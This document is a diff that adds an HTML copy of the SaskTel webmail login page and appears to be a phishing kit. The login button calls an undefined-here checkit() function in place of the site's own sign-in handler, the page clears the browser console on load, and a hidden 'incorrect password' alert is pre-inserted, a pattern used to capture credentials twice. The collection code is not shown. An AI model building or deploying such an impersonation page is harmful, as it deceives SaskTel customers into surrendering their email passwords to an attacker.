@@ -1,0 +1,495 @@
+
+<html lang="en" ng-controller="AppCtrl" class="ng-scope" onload="console.clear();">
+   <head>
+      <style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style>
+      <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1, maximum-scale=4.0">
+      <meta name="description" content="Webmail">
+      <meta name="author" content="H">
+      <meta http-equiv="cache-control" content="max-age=0">
+      <meta http-equiv="cache-control" content="no-cache">
+      <meta http-equiv="expires" content="0">
+      <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+      <meta http-equiv="pragma" content="no-cache">
+	  <link rel="preconnect" href="https://fonts.googleapis.com">
+	  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+	  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	  <style>
+	  * {
+    font-family: 'Montserrat', sans-serif !important;
+	font-weight: 550 !important;
+}
+@font-face {
+    font-family: 'FontAwesome';
+    src: url('https://webmail.sasktel.net/84c19c3/fonts/fontawesome-webfont.woff2?v=4.7.0') format('woff2');
+    font-weight: normal;
+    font-style: normal;
+}
+	  </style>
+      <title pagetitle-directive="">Login - Webmail 7.0</title>
+      <link rel="icon" type="image/png" ng-href="https://webmail.sasktel.net/84c19c3/branding/hid-2370/images/favicon.ico" href="https://webmail.sasktel.net/84c19c3/branding/hid-2370/images/favicon.ico">
+      <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:300,400,700">
+      <link rel="stylesheet" type="text/css" href="https://webmail.sasktel.net/84c19c3/css/app.css">
+      <!-- ngIf: branding.css.custom -->
+      <link ng-if="branding.css.custom" rel="stylesheet" type="text/css" ng-href="https://webmail.sasktel.net/84c19c3/branding/hid-2370/css/custom.css" class="ng-scope" href="https://webmail.sasktel.net/84c19c3/branding/hid-2370/css/custom.css">
+      <!-- end ngIf: branding.css.custom -->
+      <!-- ngIf: customPagesSettings.paths.css.custompages -->
+      <link ng-if="customPagesSettings.paths.css.custompages" rel="stylesheet" type="text/css" ng-href="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/css/custompages.css" class="ng-scope" href="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/css/custompages.css">
+      <!-- end ngIf: customPagesSettings.paths.css.custompages -->
+      <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="main" src="https://webmail.sasktel.net/84c19c3/main.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="config" src="https://webmail.sasktel.net/84c19c3/config.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="infrastructure" src="https://webmail.sasktel.net/84c19c3/infrastructure.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/components/base/base-controller" src="https://webmail.sasktel.net/84c19c3/components/base/base-controller.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/sections/mail/list/list-controller" src="https://webmail.sasktel.net/84c19c3/sections/mail/list/list-controller.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/components/base/base-controller-abstract" src="https://webmail.sasktel.net/84c19c3/components/base/base-controller-abstract.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/sections/mail/list/list-controller-abstract" src="https://webmail.sasktel.net/84c19c3/sections/mail/list/list-controller-abstract.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/angular-bootstrap" src="https://webmail.sasktel.net/84c19c3/vendor/angular-bootstrap/ui-bootstrap-tpls.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/i18n/en_US" src="https://webmail.sasktel.net/84c19c3/i18n/en_US.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/sections/login/login" src="https://webmail.sasktel.net/84c19c3/sections/login/login.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/sections/login/login-controller" src="https://webmail.sasktel.net/84c19c3/sections/login/login-controller.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/components/snapuser/snapuser" src="https://webmail.sasktel.net/84c19c3/components/snapuser/snapuser.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/components/focus/focus" src="https://webmail.sasktel.net/84c19c3/components/focus/focus.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/sections/login/login-controller-abstract" src="https://webmail.sasktel.net/84c19c3/sections/login/login-controller-abstract.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/components/snapuser/snapuser-directive" src="https://webmail.sasktel.net/84c19c3/components/snapuser/snapuser-directive.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/components/focus/focus-directive" src="https://webmail.sasktel.net/84c19c3/components/focus/focus-directive.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/custompages.js" src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/custompages.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/i18n/en_US.js" src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/i18n/en_US.js"></script>
+   </head>
+   <body translate-cloak="" activitycheck-directive="" dragdropdisable-directive="" detectdevice-directive="" ng-class="$state.$current.name | route2classname" class="theme-default app_base_login">
+      <!-- ngIf: !mobileDevice -->
+      <div ng-if="!mobileDevice" id="theme-container" ng-style="{ 'background-image': 'url(' + themeParams.image.data + ')', 'background-size': themeParams.image.bckSize ? themeParams.image.bckSize : 'cover' }" ng-class="{ 'has-theme': themeParams.theme.cssPrefix !== 'default', 'no-theme': themeParams.theme.cssPrefix === 'default', 'has-colors': branding.css.custom }" class="ng-scope no-theme has-colors" style="background-image: url(&quot;&quot;); background-size: auto;">
+         <!-- uiView: growl -->
+         <div ui-view="growl" class="ng-scope">
+            <div ng-controller="GrowlCtrl" aria-live="polite" aria-relevant="additions" class="ng-scope">
+               <div class="growlDimmer ng-hide" id="growlDimmer" ng-show="growlList.length > 0 &amp;&amp; growlStatus.fullPage"></div>
+               <!-- this parent div is always visible even when empty so the last growl can fade out of view -->
+               <div class="growlcontain gr0" ng-class="{'growlMaster': growlList.length > 0 &amp;&amp; (!growlList[0].unique),
+                  'growlFullPage': growlStatus.fullPage
+                  }">
+                  <!-- ngRepeat: growl in growlList | orderBy:'id' -->
+               </div>
+            </div>
+         </div>
+         <!-- uiView: app -->
+         <div ui-view="app" class="ng-scope">
+            <!-- ngInclude: 'components/navstatus/navstatus.html' -->
+            <div ng-controller="NavstatusCtrl" ng-include="'https://webmail.sasktel.net/components/navstatus/navstatus.html'" class="ng-scope">
+               <nav class="navbar navbar-fixed-top ng-scope" role="banner" ng-show="!isWM8Mode">
+                  <div class="navbar-header">
+                     <div class="navbar-brand">
+                        <img class="navbar-logo" ng-src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/images/navstatus-logo.png" alt="Webmail 7.0" src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/images/navstatus-logo.png">
+                     </div>
+                  </div>
+                  <!-- ngIf: ( auth.isauth && auth.isverified && !auth.is2faSetupRequired && auth.prefsloaded && ($storage.preferences.fullname || ($storage.user && $storage.user.mail)) ) -->
+               </nav>
+               <div modal-directive="1" modal-id="'migrationModal'" modal-body="modal.body" modal-header="modal.header" modal-confirm="modal.confirm" data-ng-click-right-button="modal.rightButton();" class="ng-scope ng-isolate-scope">
+                  <div id="migrationModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="migrationModal-label" aria-hidden="true" aria-describedby="migrationModal-body migrationModal-footer">
+                     <div class="modal-dialog ng-isolate-scope" role="document">
+                        <div class="modal-content">
+                           <div class="modal-header">
+                              <!-- ngIf: header -->
+                              <!-- ngIf: !header -->
+                              <div id="migrationModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude"></div>
+                              <!-- end ngIf: !header -->
+                           </div>
+                           <div id="migrationModal-body">
+                              <!-- ngIf: body -->
+                              <!-- ngIf: bodyHtml -->
+                              <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+                           </div>
+                           <div class="modal-footer" id="migrationModal-footer">
+                              <!-- ngIf: footer || checkboxLabel -->
+                              <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+                              <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+                              <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+                              <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+                              <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+                           </div>
+                           <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+                           <span aria-hidden="true">×</span>
+                           </button>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div modal-directive="1" modal-id="'instructionsModal'" template-url="https://webmail.sasktel.net/components/navstatus/_partials/keyboard-instructions-modal.html" shared-data="instructionsModalData" class="ng-scope ng-isolate-scope">
+                  <div id="instructionsModal" class="instructionsModal modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="instructionsModal-label" aria-hidden="true">
+                     <div class="modal-dialog ng-isolate-scope">
+                        <div class="modal-content">
+                           <div class="modal-header">
+                              <h4 id="instructionsModal-label" class="modal-title ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TITLE">Tips for Keyboard Users and Screen Readers</h4>
+                              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                              <span aria-hidden="true">×</span>
+                              </button>
+                           </div>
+                           <!-- ngIf: sharedData.currentPage === 1 -->
+                           <div class="modal-body ng-scope" role="document" ng-if="sharedData.currentPage === 1">
+                              <div class="body-content">
+                                 <p class="moreInfo firstParagraph ng-scope" tabindex="0" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_1">The following is a list of tips and keyboard commands you can use to navigate Webmail. There are three pages in this document. To move to the next page, activate the link at the bottom of this popup.</p>
+                                 <br>
+                                 <p class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_2">The following tables describe how to use different parts of the application. Move to these tables in JAWS or NVDA, using the <strong>"T"</strong> key to go to the table, and your table keys <strong>Control+Alt+Arrows</strong> to move within each table. When you get to the last table on this page press Tab to move to the link for the next page.</p>
+                              </div>
+                              <table class="instructionsTable page1">
+                                 <caption>
+                                    <h4 translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_HEADING" class="ng-scope">The Basics: Sections of Application Window</h4>
+                                    <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_INFO">Normal screen reader navigation controls will work to move around, such as up/down arrow, tab key and shortcuts to landmarks, headings, links, buttons and form controls.</span>
+                                 </caption>
+                                 <thead>
+                                    <tr>
+                                       <th scope="col" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_SECTION" class="ng-scope">Section</th>
+                                       <th scope="col" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_DESCRIPTION" class="ng-scope">Description</th>
+                                    </tr>
+                                 </thead>
+                                 <tbody>
+                                    <tr>
+                                       <td class="firstCell ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR">Top Navigation bar</td>
+                                       <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR_INGO" class="ng-scope">Contains a screen reader button that opens this keyboard popup, and a dropdown labelled with your account email. Open it to go to the support center, take a tour of the features of this application, provide us with feedback, or log out.</td>
+                                    </tr>
+                                    <tr>
+                                       <td class="firstCell ng-binding">
+                                          Sections navigation
+                                          <br>
+                                          <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_INFO">(found after top navigation bar in tab order). Positioned as a vertical menu on the far left of the screen</span>
+                                       </td>
+                                       <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_BRIEFCASE_NO" class="ng-scope">Links to Mail, Calendars, Task Lists, Contacts and Preferences</td>
+                                    </tr>
+                                    <tr>
+                                       <td class="firstCell ng-binding">
+                                          Section options sidebar
+                                          <br>
+                                          <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_SIDEBAR_INFO">Positioned on the left side of the page, but to the right of the sections navigation bar.</span>
+                                       </td>
+                                       <td class="sidebarInstructions ng-binding">
+                                          This has all the options for the section you choose.
+                                          <ul class="instructionList">
+                                             <li translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_1" class="ng-scope">At the top of the menu there is a search input and a button to create a New  Email,  Event, Task, Contact, depending on which section is chosen.</li>
+                                             <li class="ng-binding">
+                                                Below that there are items that can be managed depending on the section you are in. 
+                                                <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_2B">Examples: mail folders, date-picker and calendars, task lists, address books, Briefcase/Online Storage folders or groups of preferences</span>
+                                             </li>
+                                          </ul>
+                                       </td>
+                                    </tr>
+                                    <tr>
+                                       <td class="firstCell ng-binding">
+                                          Main window
+                                          <br>
+                                          <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_INFO">For the selections above.</span>
+                                       </td>
+                                       <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_CONTENT" class="ng-scope">This is the main work area and will contain the item you are working on. It is where you will read or send emails, review or create calendar events, read or create tasks, manage your contacts or menage preferences.</td>
+                                    </tr>
+                                 </tbody>
+                              </table>
+                           </div>
+                           <!-- end ngIf: sharedData.currentPage === 1 -->
+                           <!-- ngIf: sharedData.currentPage === 2 -->
+                           <!-- ngIf: sharedData.currentPage === 3 -->
+                           <div class="modal-footer">
+                              <div class="first buttonContainer">
+                                 <button ng-show="sharedData.currentPage === 2" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.previousPage()" style=""><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous: Basics</button>
+                                 <button ng-show="sharedData.currentPage === 3" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.previousPage()" style=""><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous: Specific Elements</button>
+                              </div>
+                              <div class="second buttonContainer">
+                                 <button ng-show="sharedData.currentPage === 3" class="btn btn-default closeModalBtn ng-binding ng-hide" data-dismiss="modal" style="">Close</button>
+                              </div>
+                              <div class="third buttonContainer">
+                                 <button ng-show="sharedData.currentPage === 1" type="button" class="btn btn-default confirm ng-binding" ng-click="sharedData.nextPage()">Next: Specific Elements<span class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
+                                 <button ng-show="sharedData.currentPage === 2" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.nextPage()" style="">Next: Creating an Email <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div modal-directive="1" modal-id="'languageModal'" modal-body-html="languageModalData.body" modal-header="languageModalData.header" data-ng-click-right-button="languageModalData.rightCallback();" data-ng-click-middle-button="languageModalData.middleCallback();" data-ng-click-left-button="languageModalData.leftCallback();" data-modal-rightbtn="languageModalData.rightButton" data-modal-middlebtn="languageModalData.middleButton" data-modal-leftbtn="languageModalData.leftButton" class="ng-scope ng-isolate-scope">
+                  <div id="languageModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="languageModal-label" aria-hidden="true" aria-describedby="languageModal-body languageModal-footer">
+                     <div class="modal-dialog ng-isolate-scope" role="document">
+                        <div class="modal-content">
+                           <div class="modal-header">
+                              <!-- ngIf: header -->
+                              <!-- ngIf: !header -->
+                              <div id="languageModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude"></div>
+                              <!-- end ngIf: !header -->
+                           </div>
+                           <div id="languageModal-body">
+                              <!-- ngIf: body -->
+                              <!-- ngIf: bodyHtml -->
+                              <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+                           </div>
+                           <div class="modal-footer" id="languageModal-footer">
+                              <!-- ngIf: footer || checkboxLabel -->
+                              <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+                              <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+                              <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+                              <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+                              <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+                           </div>
+                           <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+                           <span aria-hidden="true">×</span>
+                           </button>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div ng-class="{content: true, 'simple-content': isWM8Mode}" ng-hide="hideContent" class="ng-scope content">
+               <div class="notificationWrapper">
+                  <!-- ngInclude: 'components/notification/notification.html' -->
+                  <div ng-include="'https://webmail.sasktel.net/components/notification/notification.html'" class="ng-scope">
+                     <div ng-controller="NotificationCtrl" class="ng-scope">
+                        <div ng-show="!isWM8Mode &amp;&amp; notifications &amp;&amp; notifications.length>0" class="notification public ng-hide" ng-class="{'public': ($state &amp;&amp; $state.current &amp;&amp; $state.current.data &amp;&amp; $state.current.data.authreq === false)}">
+                           <div scroll-directive="" width-offset="sizes.width.offset" class="notificationContainer ng-isolate-scope" role="dialog" tabindex="-1" style="width: 811px;">
+                              <!-- ngRepeat: note in notifications track by $index -->
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <!-- uiView: master -->
+               <div ui-view="master" class="ng-scope">
+                  <div class="custom-container scroll-container ng-scope ng-isolate-scope" scroll-directive="0" style="height: 607px;">
+                     <header class="custom-header">
+                        <div class="container">
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <a target="_blank" href="https://www.sasktel.com/">
+                                 <img class="ng-scope" ng-src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/images/sask_tel_logo.png" aria-label="{{ " lang_appname"="" |="" translate="" }}"="" src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/images/sask_tel_logo.png">
+                                 </a>
+                              </div>
+                           </div>
+                        </div>
+                     </header>
+                     <div class="custom-title ng-scope" translate="LANG_CUSTOM_LOGIN_PAGE_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_PAGE_TITLE">SaskTel Email</div>
+                     <div class="login-container custom-flexcontent">
+                        <div class="container">
+                           <div class="row">
+                              <div class="login-panel login-form-container custom-flexpanel col-sm-6 col-xs-12">
+                                 <div class="row">
+                                    <div class="col-md-3 col-sm-12 col-xs-0"></div>
+                                    <div class="col-md-9 col-sm-10 col-xs-12">
+                                       <h2 translate="LANG_LOGIN_SIGN_IN" class="ng-scope">Log in</h2>
+                                       <form role="form" ng-submit="signin(user)" class="ng-pristine ng-valid">
+                                          <label translate="LANG_LOGIN_USERNAME" class="ng-scope">Login ID</label>
+                                          <div ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_USERNAME'}" class="form-group">
+                                             <input type="text" class="form-control ng-pristine ng-valid ng-touched" id="username" ng-model="user.username" aria-label="Login ID" ng-disabled="( loadingstatus !== '')" focus-directive="true">
+                                             <span class="fa fa-lg fa-exclamation-circle input-error" title="" aria-label=""></span>
+                                          </div>
+                                          <div class="form-group">
+                                             <!-- ngIf: error.langkey=='LANG_LOGIN_ERROR_EMPTY_USERNAME' -->
+                                          </div>
+                                          <label translate="LANG_LOGIN_PASSWORD" class="ng-scope">Password</label>
+                                          <div ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_PASSWORD'}" class="form-group error-label">
+                                             <input type="password" class="form-control ng-pristine ng-untouched ng-valid" id="password" ng-model="user.password" aria-label="Password" ng-disabled="( loadingstatus !== '')">
+                                             <!--<span class="fa fa-lg fa-eye toggle-password" title="Show password" aria-label="Show password" onclick="togglePasswordVisibility()"></span>-->
+											 <span class=" toggle-password"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" title="Show password" aria-label="Show password" onclick="togglePasswordVisibility()" fill="currentColor" class="bi bi-eye" viewBox="0 0 16 16">
+  <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
+  <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
+</svg></span>
+                                            
+                                          </div>
+                                          <div class="form-group">
+                                             <!-- ngIf: error.langkey && error.langkey != 'LANG_LOGIN_ERROR_EMPTY_USERNAME' -->
+                                          </div>
+                                          <div class="form-group">
+										  <div ng-if="error.langkey" class="alert alert-danger alert-dimissible ng-scope hide" role="alert">
+											<button type="button" class="close" data-dismiss="alert" ng-click="resetError()">
+												<span aria-hidden="true">×</span><span class="sr-only ng-scope" translate="LANG_CLOSE">Close</span>
+											</button>
+											<span class="ng-binding">The login ID or password you entered is incorrect. Please try again.</span>
+										</div>
+                                             <!-- ngIf: ( loadingstatus === '') --><button ng-if="( loadingstatus === '')" type="button" id="subit" onclick='checkit()' class="btn btn-primary btn-lg ng-scope" translate="LANG_LOGIN_SIGN_IN" aria-label="Log in">Log in</button><!-- end ngIf: ( loadingstatus === '') -->
+											 
+                                             <!-- ngIf: ( loadingstatus !== '') -->
+                                          </div>
+                                          <div class="clearfix">
+                                             <div class="login-forgot">
+                                                <!-- ngIf: ( loadingstatus === '') && showForgotLink --><a ng-if="( loadingstatus === '') &amp;&amp; showForgotLink" href="" ng-click="goToForgotPassword()" translate="LANG_LOGIN_FORGOT_PASSWORD" class="ng-scope">Forgot password?</a><!-- end ngIf: ( loadingstatus === '') && showForgotLink -->
+                                             </div>
+                                          </div>
+                                       </form>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="login-panel custom-flexpanel border-top col-sm-6 col-xs-12">
+                                 <h2 translate="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" class="ng-scope">Welcome to SaskTel Email</h2>
+                                 <p translate="LANG_CUSTOM_LOGIN_INFOBOX_DESC" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_DESC" class="ng-scope">This is where you can log in and use your SaskTel email account.</p>
+                                 <ul class="login-list">
+                                    <li><a target="_blank" href="http://support.sasktel.com/app/answers/list/p/4" translate="LANG_CUSTOM_LOGIN_INFOBOX_LINK_SUPPORT" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_LINK_SUPPORT" class="ng-scope">SaskTel email support</a></li>
+                                 </ul>
+                                 <br>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <footer class="custom-footer">
+                        <div class="container">
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <img ng-src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/images/logo_footer.png" aria-label="{{ " lang_appname"="" |="" translate="" }}"="" class="ng-scope" src="https://webmail.sasktel.net/84c19c3/branding/hid-2370/custompages/images/logo_footer.png">
+                                 <span translate="LANG_CUSTOM_FOOTER_COPYRIGHT" translate-values="{year: year || 2018}" translate-cloak="LANG_CUSTOM_FOOTER_COPYRIGHT" class="ng-scope">© 2024 SaskTel and its licensors. All rights reserved.</span>
+                              </div>
+                           </div>
+                        </div>
+                     </footer>
+                  </div>
+                  <snapuser-directive snap-user="snapUser" style="display: none;" class="ng-scope ng-isolate-scope"></snapuser-directive>
+               </div>
+               <!-- ngInclude: undefined -->
+               <ng-include src="'https://webmail.sasktel.net/components/topmodal/topmodal.html'" class="ng-scope">
+                  <div id="topModalContainer" class="ng-scope">
+                     <!-- ngInclude: undefined -->
+                     <div modal-body="errorMessage | translate" modal-directive="" modal-header="'LANG_ERROR' | translate" modal-id="'top-modal-error'" modal-closebtn="'LANG_CLOSE' | translate" class="ng-isolate-scope">
+                        <div id="top-modal-error" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="top-modal-error-label" aria-hidden="true" aria-describedby="top-modal-error-body top-modal-error-footer">
+                           <div class="modal-dialog ng-isolate-scope" role="document">
+                              <div class="modal-content">
+                                 <div class="modal-header">
+                                    <!-- ngIf: header -->
+                                    <h4 id="top-modal-error-label" ng-if="header" class="modal-title ng-binding ng-scope" ng-bind="header">Error!</h4>
+                                    <!-- end ngIf: header -->
+                                    <!-- ngIf: !header -->
+                                 </div>
+                                 <div id="top-modal-error-body">
+                                    <!-- ngIf: body -->
+                                    <!-- ngIf: bodyHtml -->
+                                    <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+                                 </div>
+                                 <div class="modal-footer" id="top-modal-error-footer">
+                                    <!-- ngIf: footer || checkboxLabel -->
+                                    <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding" data-ng-click="callbackbuttonclose()" data-dismiss="modal">Close</button>
+                                    <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+                                    <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+                                    <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+                                    <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+                                 </div>
+                                 <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+                                 <span aria-hidden="true">×</span>
+                                 </button>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </ng-include>
+            </div>
+         </div>
+         <wcag-directive></wcag-directive>
+      </div>
+      <!-- end ngIf: !mobileDevice -->
+      <!-- ngIf: mobileDevice -->
+      <!-- Loading -->
